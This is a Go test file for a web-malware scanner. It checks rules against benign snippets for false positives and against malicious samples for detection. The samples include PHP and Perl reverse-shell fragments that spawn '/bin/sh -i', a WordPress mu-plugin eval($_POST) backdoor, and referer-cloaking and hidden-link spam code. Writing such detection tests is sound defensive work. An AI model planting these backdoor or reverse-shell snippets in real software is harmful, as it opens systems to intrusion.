package signatures

import "testing"

// YAML-engine mirror of the context-arm FP-flood fixes. File type filters
// already shield php_goto (.cpp) and exploit_symlink (.ts); the remaining
// rules need explicit boundary, proximity, or executable-context gates.

func TestFPFlood_YML_RevshellPentestmonkey_MailchimpClient(t *testing.T) {
	s := loadRepoScanner(t)
	legit := []byte("<?php class MCAPI { function callServer(){ $sock = fsockopen($this->host, 80); fwrite($sock, $payload); } }")
	if hasRule(s.ScanContent(legit, ".php"), "revshell_pentestmonkey") {
		t.Error("revshell_pentestmonkey FP: matched a MailChimp API HTTP client")
	}
	mal := []byte("<?php $sock=fsockopen($ip,$port); $proc=proc_open('/bin/sh -i', $d, $p);")
	if !hasRule(s.ScanContent(mal, ".php"), "revshell_pentestmonkey") {
		t.Error("revshell_pentestmonkey regression: real reverse shell not detected")
	}
}

func TestFPFlood_YML_SpamCloakingReferer_SecurityRuleset(t *testing.T) {
	s := loadRepoScanner(t)
	legit := []byte("<?php $patterns = array('HTTP_REFERER' => 'google.*bing'); $conf .= \"referer google include block\";")
	if hasRule(s.ScanContent(legit, ".php"), "spam_cloaking_referer") {
		t.Error("spam_cloaking_referer FP: matched a security ruleset / config comment")
	}
	mal := []byte("<?php if (strpos($_SERVER['HTTP_REFERER'],'google')!==false){ include 'spam.html'; }")
	if !hasRule(s.ScanContent(mal, ".php"), "spam_cloaking_referer") {
		t.Error("spam_cloaking_referer regression: real referer cloaker not detected")
	}
}

func TestFPFlood_YML_BackdoorWpMuplugin_Doubleval(t *testing.T) {
	s := loadRepoScanner(t)
	legit := []byte("<?php // mu-plugins loader\n$v = doubleval($_GET['beds']);")
	if hasRule(s.ScanContent(legit, ".php"), "backdoor_wp_muplugin") {
		t.Error("backdoor_wp_muplugin FP: doubleval() read as eval")
	}
	mal := []byte("<?php // wp-content/mu-plugins/x.php\neval($_POST['x']);")
	if !hasRule(s.ScanContent(mal, ".php"), "backdoor_wp_muplugin") {
		t.Error("backdoor_wp_muplugin regression: real mu-plugin backdoor not detected")
	}
}

func TestFPFlood_YML_SpamPharma_RequiresOneCluster(t *testing.T) {
	s := loadRepoScanner(t)
	var legit []byte
	legit = append(legit, []byte("<div style=\"display:none\"></div>")...)
	legit = append(legit, make([]byte, 1200)...)
	legit = append(legit, []byte("cialis")...)
	legit = append(legit, make([]byte, 1200)...)
	legit = append(legit, []byte("order now")...)
	if hasRule(s.ScanContent(legit, ".html"), "spam_pharma_generic") {
		t.Error("spam_pharma_generic FP: matched scattered theme-demo signals")
	}

	var pairs []byte
	pairs = append(pairs, []byte("cialis order now")...)
	pairs = append(pairs, make([]byte, 900)...)
	pairs = append(pairs, []byte("cialis display:none")...)
	pairs = append(pairs, make([]byte, 900)...)
	pairs = append(pairs, []byte("order now display:none")...)
	if hasRule(s.ScanContent(pairs, ".html"), "spam_pharma_generic") {
		t.Error("spam_pharma_generic FP: combined signals from disconnected pairs")
	}

	mal := []byte("<div style=\"display:none\">cialis order now</div>")
	if !hasRule(s.ScanContent(mal, ".html"), "spam_pharma_generic") {
		t.Error("spam_pharma_generic regression: hidden pharma block not detected")
	}
}

func TestFPFlood_YML_SpamFooter_DoesNotBridgeEchoStatements(t *testing.T) {
	s := loadRepoScanner(t)
	legit := []byte(`<?php add_action('wp_footer', function() { echo '<div style="display:none">settings</div>'; render_widgets(); echo '<a href="https://docs.example/">Help</a>'; });`)
	if hasRule(s.ScanContent(legit, ".php"), "spam_link_injector") {
		t.Error("spam_link_injector FP: bridged unrelated echo statements")
	}

	noHook := []byte(`<?php wp_footer(); echo '<div style="display:none"><a href="https://docs.example/">One</a></div>'; echo "<a href='https://docs.example/'>Two</a><span style='visibility:hidden'>x</span>";`)
	if hasRule(s.ScanContent(noHook, ".php"), "spam_link_injector") {
		t.Error("spam_link_injector FP: counted two output regexes in place of add_action")
	}

	mal := []byte(`<?php add_action('wp_footer', function() { echo '<div style="display:none"><a href="https://spam.example/">loan</a></div>'; });`)
	if !hasRule(s.ScanContent(mal, ".php"), "spam_link_injector") {
		t.Error("spam_link_injector regression: hidden footer link not detected")
	}
}

func TestFPFlood_YML_SpamCloakingReferer_RequiresGatedOutput(t *testing.T) {
	s := loadRepoScanner(t)
	ungated := []byte("<?php $fromGoogle = strpos($_SERVER['HTTP_REFERER'], 'google') !== false; audit($fromGoogle); echo $normalPage;")
	if hasRule(s.ScanContent(ungated, ".php"), "spam_cloaking_referer") {
		t.Error("spam_cloaking_referer FP: matched output not gated by the referer check")
	}

	redirect := []byte("<?php if (stripos($_SERVER['HTTP_REFERER'], 'bing') !== false) { wp_redirect('https://spam.example/'); }")
	if !hasRule(s.ScanContent(redirect, ".php"), "spam_cloaking_referer") {
		t.Error("spam_cloaking_referer regression: gated wp_redirect was not detected")
	}
}

func TestFPFlood_YML_RevshellPerl_RequiresExecutableShebang(t *testing.T) {
	s := loadRepoScanner(t)
	legit := []byte("<?php $example='#!/usr/bin/perl use Socket socket('; mysqli_connect($host); curl_exec($ch);")
	if hasRule(s.ScanContent(legit, ".php"), "revshell_perl") {
		t.Error("revshell_perl FP: accepted embedded Perl tokens in a PHP library")
	}

	mal := []byte("#!/usr/bin/perl\nuse Socket;\nsocket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));\nconnect(SOCK, $paddr);\nexec('/bin/sh -i');")
	if !hasRule(s.ScanContent(mal, ".pl"), "revshell_perl") {
		t.Error("revshell_perl regression: multiline Perl reverse shell not detected")
	}
}
